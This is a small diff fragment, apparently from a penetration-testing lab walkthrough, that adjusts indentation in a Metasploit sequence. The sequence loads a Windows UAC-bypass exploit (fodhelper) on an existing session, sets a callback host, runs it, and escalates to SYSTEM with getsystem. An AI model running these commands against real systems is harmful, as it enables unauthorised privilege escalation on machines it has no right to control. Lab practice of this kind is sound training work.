@@ -282,7 +282,7 @@ use exploit/windows/local/bypassuac_fodhelper
 set session 1
 show options
 set LHOST 10.10.1.13
- set TARGET 0
+set TARGET 0
 exploit
 getsystem -t 1 
 getuid
